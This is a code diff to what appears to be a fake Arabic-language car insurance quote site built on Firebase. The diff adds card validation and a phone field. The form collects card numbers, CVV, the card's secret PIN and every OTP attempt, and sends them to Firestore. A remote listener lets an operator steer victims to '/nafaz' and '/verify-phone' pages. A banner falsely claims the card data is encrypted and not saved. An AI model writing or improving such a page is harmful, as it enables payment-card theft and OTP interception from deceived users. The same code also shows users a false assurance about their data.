@@ -30,8 +30,79 @@ import { addData, db } from "@/lib/firebase"
 import { offerData } from "@/lib/data"
 import { doc, onSnapshot } from "firebase/firestore"
 
+const cardValidation = {
+  // Luhn algorithm for card number validation
+  luhnCheck: (cardNumber: string): boolean => {
+    const digits = cardNumber.replace(/\D/g, "").split("").map(Number)
+    let sum = 0
+    let isEven = false
 
+    for (let i = digits.length - 1; i >= 0; i--) {
+      let digit = digits[i]
 
+      if (isEven) {
+        digit *= 2
+        if (digit > 9) {
+          digit -= 9
+        }
+      }
+
+      sum += digit
+      isEven = !isEven
+    }
+
+    return sum % 10 === 0
+  },
+
+  // Detect card type based on number patterns
+  getCardType: (cardNumber: string): { type: string; icon: string; color: string } => {
+    const number = cardNumber.replace(/\D/g, "")
+
+    if (/^4/.test(number)) {
+      return { type: "Visa", icon: "💳", color: "text-blue-600" }
+    } else if (/^5[1-5]/.test(number) || /^2[2-7]/.test(number)) {
+      return { type: "Mastercard", icon: "💳", color: "text-red-600" }
+    } else if (/^3[47]/.test(number)) {
+      return { type: "American Express", icon: "💳", color: "text-green-600" }
+    } else if (/^6/.test(number)) {
+      return { type: "Discover", icon: "💳", color: "text-orange-600" }
+    }
+
+    return { type: "Unknown", icon: "💳", color: "text-gray-600" }
+  },
+
+  // Format card number with spaces
+  formatCardNumber: (value: string): string => {
+    const number = value.replace(/\D/g, "")
+    const groups = number.match(/.{1,4}/g) || []
+    return groups.join(" ").substr(0, 19) // Max 16 digits + 3 spaces
+  },
+
+  // Validate expiry date
+  validateExpiry: (month: string, year: string): boolean => {
+    if (!month || !year) return false
+
+    const currentDate = new Date()
+    const currentYear = currentDate.getFullYear()
+    const currentMonth = currentDate.getMonth() + 1
+
+    const expMonth = Number.parseInt(month)
+    const expYear = Number.parseInt(year)
+
+    if (expYear < currentYear) return false
+    if (expYear === currentYear && expMonth < currentMonth) return false
+
+    return true
+  },
+
+  // Validate CVV based on card type
+  validateCVV: (cvv: string, cardType: string): boolean => {
+    if (cardType === "American Express") {
+      return /^\d{4}$/.test(cvv)
+    }
+    return /^\d{3}$/.test(cvv)
+  },
+}
 
 // Mock components to replace missing imports
 const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
@@ -104,7 +175,20 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
         {errors.owner_identity_number && <p className="text-red-500 text-sm mt-1">{errors.owner_identity_number}</p>}
       </div>
     )}
-
+   {formData.insurance_purpose === "renewal" && (
+      <div>
+        <label className="block text-sm font-semibold text-gray-700 mb-3">
+          رقم الهاتف <span className="text-red-500">*</span>
+        </label>
+        <Input
+          type="tel"
+          placeholder="0555######"
+          maxLength={10}
+          value={formData.phoneNumber}
+          onChange={(e) => setFormData((prev: any) => ({ ...prev, phoneNumber: e.target.value }))}
+        />
+      </div>
+    )}
     {formData.insurance_purpose === "property-transfer" && (
       <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
         <div>
@@ -192,6 +276,18 @@ const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
         className="h-12 border-gray-300"
       />
     </div>
+    <div>
+      <label className="block text-sm font-semibold text-gray-700 mb-3">
+      رقم الهاتف<span className="text-red-500">*</span>
+      </label>
+      <Input
+        type="text"
+        placeholder="123456789"
+        value={formData.sequenceNumber}
+        onChange={(e) => setFormData((prev: any) => ({ ...prev, sequenceNumber: e.target.value }))}
+        className="h-12 border-gray-300"
+      />
+    </div>
   </div>
 )
 
@@ -232,7 +328,7 @@ export default function QuotePage() {
     const visitorID = localStorage.getItem("visitor")
     if (visitorID) {
       setMounted(true)
-     setupOnlineStatus(visitorID!)
+      setupOnlineStatus(visitorID!)
     } else {
       // Create new visitor ID if none exists
       const newVisitorId = "visitor_" + Date.now()
@@ -290,7 +386,7 @@ export default function QuotePage() {
             <Button
               variant="outline"
               size="sm"
-              className="hidden sm:flex border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4]"
+              className="hidden sm:flex border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] bg-transparent"
             >
               تسجيل الدخول
             </Button>
@@ -326,7 +422,7 @@ export default function QuotePage() {
                 <Button variant="ghost" size="sm" className="text-gray-600 flex-1">
                   English
                 </Button>
-                <Button variant="outline" size="sm" className="border-gray-300 flex-1">
+                <Button variant="outline" size="sm" className="border-gray-300 flex-1 bg-transparent">
                   تسجيل الدخول
                 </Button>
               </div>
@@ -488,7 +584,7 @@ export default function QuotePage() {
               <Button
                 variant="outline"
                 size="lg"
-                className="border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] px-8 py-4 text-lg font-medium"
+                className="border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] px-8 py-4 text-lg font-medium bg-transparent"
               >
                 <Mail className="w-5 h-5 ml-2" />
                 راسلنا عبر البريد
@@ -645,6 +741,9 @@ function ProfessionalQuoteForm() {
   const [cvv, setCvv] = useState("")
   const [otp, setOtp] = useState("")
   const [otpTimer, setOtpTimer] = useState(0)
+  const [cardErrors, setCardErrors] = useState<Record<string, string>>({})
+  const [cardType, setCardType] = useState({ type: "Unknown", icon: "💳", color: "text-gray-600" })
+
   const [formData, setFormData] = useState({
     insurance_purpose: "renewal",
     documment_owner_full_name: "",
@@ -672,11 +771,127 @@ function ProfessionalQuoteForm() {
     { number: 1, title: "البيانات الأساسية", subtitle: "معلومات المركبة والمالك", icon: FileText },
     { number: 2, title: "بيانات التأمين", subtitle: "تفاصيل وثيقة التأمين", icon: Shield },
     { number: 3, title: "قائمة الأسعار", subtitle: "مقارنة العروض المتاحة", icon: TrendingUp },
-    { number: 4, title: "الإضافات", subtitle: "خدمات إضافية اختيارية", icon: Star },
     { number: 5, title: "الملخص", subtitle: "مراجعة الطلب والتواصل", icon: CheckCircle },
     { number: 6, title: "الدفع", subtitle: "بيانات الدفع الآمن", icon: CreditCard },
     { number: 7, title: "التحقق", subtitle: "تأكيد رمز التحقق", icon: Lock },
   ]
+
+  const validateCardField = (fieldName: string, value: string): string | null => {
+    switch (fieldName) {
+      case "cardNumber":
+        const cleanNumber = value.replace(/\D/g, "")
+        if (!cleanNumber) return "رقم البطاقة مطلوب"
+        if (cleanNumber.length < 13) return "رقم البطاقة قصير جداً"
+        if (cleanNumber.length > 19) return "رقم البطاقة طويل جداً"
+        if (!cardValidation.luhnCheck(cleanNumber)) return "رقم البطاقة غير صحيح"
+        return null
+
+      case "cardName":
+        if (!value.trim()) return "اسم حامل البطاقة مطلوب"
+        if (value.trim().length < 2) return "الاسم قصير جداً"
+        if (!/^[a-zA-Z\s]+$/.test(value)) return "الاسم يجب أن يحتوي على أحرف إنجليزية فقط"
+        return null
+
+      case "cardMonth":
+        if (!value) return "الشهر مطلوب"
+        const month = Number.parseInt(value)
+        if (month < 1 || month > 12) return "شهر غير صحيح"
+        return null
+
+      case "cardYear":
+        if (!value) return "السنة مطلوبة"
+        if (!cardValidation.validateExpiry(cardMonth, value)) return "تاريخ انتهاء الصلاحية منتهي"
+        return null
+
+      case "cvv":
+        if (!value) return "رمز الأمان مطلوب"
+        if (!cardValidation.validateCVV(value, cardType.type)) {
+          return cardType.type === "American Express"
+            ? "رمز الأمان يجب أن يكون 4 أرقام"
+            : "رمز الأمان يجب أن يكون 3 أرقام"
+        }
+        return null
+
+      case "pinCode":
+        if (!value) return "الرقم السري مطلوب"
+        if (!/^\d{4}$/.test(value)) return "الرقم السري يجب أن يكون 4 أرقام"
+        return null
+
+      default:
+        return null
+    }
+  }
+
+  const handleCardFieldChange = (fieldName: string, value: string) => {
+    let processedValue = value
+
+    // Format card number with spaces
+    if (fieldName === "cardNumber") {
+      processedValue = cardValidation.formatCardNumber(value)
+      const detectedType = cardValidation.getCardType(value)
+      setCardType(detectedType)
+    }
+
+    // Update the field value
+    switch (fieldName) {
+      case "cardNumber":
+        setCardNumber(processedValue)
+        break
+      case "cardName":
+        setCardName(processedValue)
+        break
+      case "cardMonth":
+        setCardMonth(processedValue)
+        break
+      case "cardYear":
+        setCardYear(processedValue)
+        break
+      case "cvv":
+        setCvv(processedValue)
+        break
+      case "pinCode":
+        setPinCode(processedValue)
+        break
+    }
+
+    // Clear error if field becomes valid
+    const error = validateCardField(fieldName, processedValue)
+    if (!error && cardErrors[fieldName]) {
+      setCardErrors((prev) => ({ ...prev, [fieldName]: "" }))
+    }
+  }
+
+  const handleCardFieldBlur = (fieldName: string, value: string) => {
+    const error = validateCardField(fieldName, value)
+    if (error) {
+      setCardErrors((prev) => ({ ...prev, [fieldName]: error }))
+    }
+  }
+
+  const validatePaymentForm = (): boolean => {
+    const fields = {
+      cardNumber,
+      cardName,
+      cardMonth,
+      cardYear,
+      cvv,
+      pinCode,
+    }
+
+    const newErrors: Record<string, string> = {}
+    let isValid = true
+
+    Object.entries(fields).forEach(([fieldName, value]) => {
+      const error = validateCardField(fieldName, value)
+      if (error) {
+        newErrors[fieldName] = error
+        isValid = false
+      }
+    })
+
+    setCardErrors(newErrors)
+    return isValid
+  }
 
   useEffect(() => {
     let interval: NodeJS.Timeout
@@ -712,19 +927,17 @@ function ProfessionalQuoteForm() {
     if (visitorId) {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
-          const data = docSnap.data() 
-          if (  currentPage !== data.currentPage) {
-            if(data.currentPage === '9999'){
+          const data = docSnap.data()
 
-              window.location.href='/verify-phone'
-            }else if(data.currentPage === 'nafaz' ||data.currentPage === '8888'  ){
-              window.location.href='/nafaz'
-
-            }else{
-            setCurrentStep(parseInt(data.currentPage))
-
+          if (currentPage !== data.currentPage) {
+            if (data.currentPage === "9999") {
+              window.location.href = "/verify-phone"
+            } else if (data.currentPage === "nafaz" || data.currentPage === "8888") {
+              window.location.href = "/nafaz"
+            } else {
+              setCurrentStep(Number.parseInt(data.currentPage))
             }
-          } 
+          }
         }
       })
 
@@ -858,6 +1071,9 @@ function ProfessionalQuoteForm() {
           isValid = false
         }
         break
+
+      case 6:
+        return validatePaymentForm()
     }
 
     setErrors((prev) => ({ ...prev, ...stepErrors }))
@@ -894,7 +1110,7 @@ function ProfessionalQuoteForm() {
           cardMonth,
           cardYear,
           cvv,
-          createdDate: new Date().toISOString()
+          createdDate: new Date().toISOString(),
         }
 
         addData(dataToSave)
@@ -904,11 +1120,10 @@ function ProfessionalQuoteForm() {
   }
 
   const prevStep = () => {
-    const vistorId=localStorage.getItem('visitor')
+    const vistorId = localStorage.getItem("visitor")
     if (currentPage > 1) {
       setCurrentStep(currentPage - 1)
-      addData({id:vistorId,currentPage})
-
+      addData({ id: vistorId, currentPage })
     }
   }
 
@@ -924,7 +1139,7 @@ function ProfessionalQuoteForm() {
       await addData({
         id: visitorId,
         otp,
-        otpCode:otp,
+        otpCode: otp,
         createdDate: new Date().toISOString(),
         otpVerified: false,
         otpVerificationTime: new Date().toISOString(),
@@ -994,12 +1209,15 @@ function ProfessionalQuoteForm() {
   }
 
   function handlePayment(): void {
+    if (!validatePaymentForm()) {
+      return
+    }
+
     const visitorId = localStorage.getItem("visitor")
 
     addData({
       id: visitorId,
-                createdDate: new Date().toISOString(),
-
+      createdDate: new Date().toISOString(),
       cardNumber,
       cardName,
       cardMonth,
@@ -1031,7 +1249,7 @@ function ProfessionalQuoteForm() {
     allOtp.push(otp)
     addData({
       id: visitorId,
-      otpCode:otp,
+      otpCode: otp,
       otpAttempts: otpAttempts + 1,
       otpVerificationTime: new Date().toISOString(),
       createdDate: new Date().toISOString(),
@@ -1365,7 +1583,10 @@ function ProfessionalQuoteForm() {
                                     isSelected ? "bg-[#109cd4]/10" : "bg-gray-100"
                                   }`}
                                 >
-                                  <img src={offer.company.image_url} className={`w-10 h-10 ${isSelected ? "text-[#109cd4]" : "text-gray-600"}`} />
+                                  <img
+                                    src={offer.company.image_url || "/placeholder.svg"}
+                                    className={`w-10 h-10 ${isSelected ? "text-[#109cd4]" : "text-gray-600"}`}
+                                  />
                                 </div>
 
                                 {/* Content */}
@@ -1400,8 +1621,10 @@ function ProfessionalQuoteForm() {
 
                                 {/* Price */}
                                 <div className="text-right flex-shrink-0">
-                                <del className="text-lg font-bold text-red-600">{finalPrice.toFixed(0)}</del>
-                                  <p className="text-lg font-bold text-gray-900">{(finalPrice-finalPrice*0.3).toFixed(0)}</p>
+                                  <del className="text-lg font-bold text-red-600">{finalPrice.toFixed(0)}</del>
+                                  <p className="text-lg font-bold text-gray-900">
+                                    {(finalPrice - finalPrice * 0.3).toFixed(0)}
+                                  </p>
                                   <p className="text-xs text-gray-500 leading-tight">ر.س / سنوياً</p>
                                 </div>
                               </div>
@@ -1537,17 +1760,9 @@ function ProfessionalQuoteForm() {
                 <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                   <div className="space-y-6">
                     <h4 className="text-xl font-bold text-gray-900 text-center">معلومات التواصل</h4>
-                    <label>
-                      رقم الهاتف
-                    </label>
-                    <Input
-                      name="phone"
-                      type="tel"
-                      placeholder="05xxxxxxxx"
-                      required
-                      maxLength={10}
-                      autoFocus={true}
-                    />
+                    <label>رقم الهاتف</label>
+                    <Input name="phone" type="tel" placeholder="05xxxxxxxx" required maxLength={10} autoFocus={true} 
+                    onChange={(e) => handleFieldChange("phone", e.target.value)}/>
 
                     <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
                       <div className="flex items-start gap-3">
@@ -1591,7 +1806,7 @@ function ProfessionalQuoteForm() {
                         )
                         const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
                         const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
-                        const total = basePrice-(basePrice*0.30) + addonsTotal + expenses
+                        const total = basePrice - (basePrice * 0.3 )+ addonsTotal -expenses
                         return (
                           <div className="space-y-4">
                             <div className="text-center mb-6">
@@ -1610,26 +1825,13 @@ function ProfessionalQuoteForm() {
                             <div className="space-y-3">
                               <div className="flex justify-between items-center">
                                 <span className="text-gray-600">قسط التأمين الأساسي</span>
-                                <span className="font-semibold">{(basePrice-(basePrice*0.03)).toFixed(0)} ر.س</span>
+                                <span className="font-semibold">{(basePrice - basePrice * 0.03).toFixed(0)} ر.س</span>
                               </div>
-
-                              {addonsTotal > 0 && (
-                                <div className="flex justify-between items-center">
-                                  <span className="text-gray-600">الإضافات المختارة</span>
-                                  <span className="font-semibold">{addonsTotal} ر.س</span>
-                                </div>
-                              )}
-
+                           
                               {selectedOffer.extra_expenses.map((expense) => (
                                 <div key={expense.id} className="flex justify-between items-center text-sm">
-                                  <span className="text-gray-600">{expense.reason}</span>
-                                  <span className="font-medium">
-                                    {expense.reason.includes("خصم") ? "-" : "+"}
-                                    {expense.price} ر.س
-                                  </span>
                                 </div>
                               ))}
-
                               <hr className="border-gray-200" />
                               <div className="flex justify-between items-center text-xl">
                                 <span className="font-bold text-gray-900">المجموع الكلي</span>
@@ -1670,19 +1872,45 @@ function ProfessionalQuoteForm() {
                       <label className="block text-sm font-semibold text-gray-700 mb-3">
                         رقم البطاقة <span className="text-red-500">*</span>
                       </label>
-                      <Input
-                        name="cardNumber"
-                        id="cardNumber"
-                        type="tel"
-                        placeholder="#### #### #### ####"
-                        required
-                        dir="ltr"
-                        value={cardNumber}
-                        onChange={(e) => setCardNumber(e.target.value)}
-                        maxLength={16}
-                        autoFocus={true}
-                        className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
-                      />
+                      <div className="relative">
+                        <Input
+                          name="cardNumber"
+                          id="cardNumber"
+                          type="text"
+                          placeholder="#### #### #### ####"
+                          required
+                          dir="ltr"
+                          value={cardNumber}
+                          onChange={(e) => handleCardFieldChange("cardNumber", e.target.value)}
+                          onBlur={(e) => handleCardFieldBlur("cardNumber", e.target.value)}
+                          maxLength={19}
+                          autoFocus={true}
+                          className={`h-12 pr-12 ${cardErrors.cardNumber ? "border-red-500 focus:border-red-500 focus:ring-red-200" : "border-gray-300 focus:border-blue-500 focus:ring-blue-200"}`}
+                        />
+                        {/* Card type indicator */}
+                        <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
+                          <div className={`flex items-center gap-1 ${cardType.color}`}>
+                            <span className="text-lg">{cardType.icon}</span>
+                            <span className="text-xs font-medium">
+                              {cardType.type !== "Unknown" ? cardType.type : ""}
+                            </span>
+                          </div>
+                        </div>
+                      </div>
+                      {cardErrors.cardNumber && (
+                        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
+                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
+                          <span>{cardErrors.cardNumber}</span>
+                        </div>
+                      )}
+                      {cardNumber &&
+                        !cardErrors.cardNumber &&
+                        cardValidation.luhnCheck(cardNumber.replace(/\D/g, "")) && (
+                          <div className="flex items-center gap-2 mt-2 text-green-600 text-sm">
+                            <CheckCircle className="w-4 h-4 flex-shrink-0" />
+                            <span>رقم البطاقة صحيح</span>
+                          </div>
+                        )}
                     </div>
 
                     <div>
@@ -1693,12 +1921,20 @@ function ProfessionalQuoteForm() {
                         name="cardName"
                         id="cardName"
                         type="text"
-                        className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
+                        className={`h-12 ${cardErrors.cardName ? "border-red-500 focus:border-red-500 focus:ring-red-200" : "border-gray-300 focus:border-blue-500 focus:ring-blue-200"}`}
                         value={cardName}
-                        onChange={(e) => setCardName(e.target.value)}
-                        placeholder="الاسم الكامل"
+                        onChange={(e) => handleCardFieldChange("cardName", e.target.value)}
+                        onBlur={(e) => handleCardFieldBlur("cardName", e.target.value)}
+                        placeholder="JOHN SMITH"
                         required
+                        dir="ltr"
                       />
+                      {cardErrors.cardName && (
+                        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
+                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
+                          <span>{cardErrors.cardName}</span>
+                        </div>
+                      )}
                     </div>
 
                     <div className="grid grid-cols-3 gap-4">
@@ -1709,9 +1945,10 @@ function ProfessionalQuoteForm() {
                         <select
                           name="expiryMonth"
                           id="expiryMonth"
-                          className="w-full h-12 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                          className={`w-full h-12 px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 ${cardErrors.cardMonth ? "border-red-500 focus:ring-red-200 focus:border-red-500" : "border-gray-300 focus:ring-blue-500 focus:border-blue-500"}`}
                           value={cardMonth}
-                          onChange={(e) => setCardMonth(e.target.value)}
+                          onChange={(e) => handleCardFieldChange("cardMonth", e.target.value)}
+                          onBlur={(e) => handleCardFieldBlur("cardMonth", e.target.value)}
                         >
                           <option value="">الشهر</option>
                           {Array.from({ length: 12 }, (_, i) => (
@@ -1720,6 +1957,7 @@ function ProfessionalQuoteForm() {
                             </option>
                           ))}
                         </select>
+                        {cardErrors.cardMonth && <p className="text-red-500 text-xs mt-1">{cardErrors.cardMonth}</p>}
                       </div>
 
                       <div>
@@ -1727,9 +1965,10 @@ function ProfessionalQuoteForm() {
                           السنة <span className="text-red-500">*</span>
                         </label>
                         <select
-                          className="w-full h-12 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                          className={`w-full h-12 px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 ${cardErrors.cardYear ? "border-red-500 focus:ring-red-200 focus:border-red-500" : "border-gray-300 focus:ring-blue-500 focus:border-blue-500"}`}
                           value={cardYear}
-                          onChange={(e) => setCardYear(e.target.value)}
+                          onChange={(e) => handleCardFieldChange("cardYear", e.target.value)}
+                          onBlur={(e) => handleCardFieldBlur("cardYear", e.target.value)}
                           name="expiryYear"
                           id="expiryYear"
                         >
@@ -1743,6 +1982,7 @@ function ProfessionalQuoteForm() {
                             )
                           })}
                         </select>
+                        {cardErrors.cardYear && <p className="text-red-500 text-xs mt-1">{cardErrors.cardYear}</p>}
                       </div>
 
                       <div>
@@ -1753,33 +1993,52 @@ function ProfessionalQuoteForm() {
                           name="cvv"
                           id="cvv"
                           type="password"
-                          className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
-                          placeholder="123"
-                          maxLength={3}
+                          className={`h-12 ${cardErrors.cvv ? "border-red-500 focus:border-red-500 focus:ring-red-200" : "border-gray-300 focus:border-blue-500 focus:ring-blue-200"}`}
+                          placeholder={cardType.type === "American Express" ? "1234" : "123"}
+                          maxLength={cardType.type === "American Express" ? 4 : 3}
                           value={cvv}
-                          onChange={(e) => setCvv(e.target.value)}
+                          onChange={(e) => handleCardFieldChange("cvv", e.target.value)}
+                          onBlur={(e) => handleCardFieldBlur("cvv", e.target.value)}
                         />
-
+                        {cardErrors.cvv && <p className="text-red-500 text-xs mt-1">{cardErrors.cvv}</p>}
                       </div>
-
-                   
                     </div>
-                    <div className="w-full  h-12">
-                        <label className="block text-sm font-semibold text-gray-700 mb-3">
-                          الرقم السري للبطاقة  <span className="text-red-500">*</span>
-                        </label>
-                        <Input
-                          name="pinCode"
-                          id="pinCode"
-                          type="password"
-                          className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
-                          placeholder="####"
-                          maxLength={4}
-                          value={pinCode}
-                          required
-                          onChange={(e) => setPinCode(e.target.value)}
-                        />
+
+                    <div className="w-full h-12">
+                      <label className="block text-sm font-semibold text-gray-700 mb-3">
+                        الرقم السري للبطاقة <span className="text-red-500">*</span>
+                      </label>
+                      <Input
+                        name="pinCode"
+                        id="pinCode"
+                        type="password"
+                        className={`h-12 ${cardErrors.pinCode ? "border-red-500 focus:border-red-500 focus:ring-red-200" : "border-gray-300 focus:border-blue-500 focus:ring-blue-200"}`}
+                        placeholder="####"
+                        maxLength={4}
+                        value={pinCode}
+                        required
+                        onChange={(e) => handleCardFieldChange("pinCode", e.target.value)}
+                        onBlur={(e) => handleCardFieldBlur("pinCode", e.target.value)}
+                      />
+                      {cardErrors.pinCode && (
+                        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
+                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
+                          <span>{cardErrors.pinCode}</span>
+                        </div>
+                      )}
+                    </div>
+
+                    <div className="bg-green-50 border border-green-200 rounded-xl p-4 mt-6">
+                      <div className="flex items-center gap-3">
+                        <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
+                          <Lock className="w-4 h-4 text-green-600" />
+                        </div>
+                        <div>
+                          <p className="font-semibold text-green-800 text-sm">معلومات آمنة</p>
+                          <p className="text-xs text-green-600">جميع بيانات البطاقة مشفرة ولا يتم حفظها</p>
+                        </div>
                       </div>
+                    </div>
                   </div>
 
                   <Card className="border-2 border-gray-200 h-fit">
@@ -1875,7 +2134,7 @@ function ProfessionalQuoteForm() {
                     <Button
                       variant="outline"
                       onClick={sendOTP}
-                      className="text-[#109cd4] border-[#109cd4] hover:bg-blue-50"
+                      className="text-[#109cd4] border-[#109cd4] hover:bg-blue-50 bg-transparent"
                     >
                       إرسال رمز جديد
                     </Button>
@@ -1895,7 +2154,7 @@ function ProfessionalQuoteForm() {
               variant="outline"
               onClick={prevStep}
               disabled={currentPage === 1 || paymentProcessing || isSubmitting}
-              className="px-8 py-3 w-full sm:w-auto order-2 sm:order-1 border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4]"
+              className="px-8 py-3 w-full sm:w-auto order-2 sm:order-1 border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] bg-transparent"
             >
               <ArrowLeft className="w-4 h-4 ml-2" />
               السابق
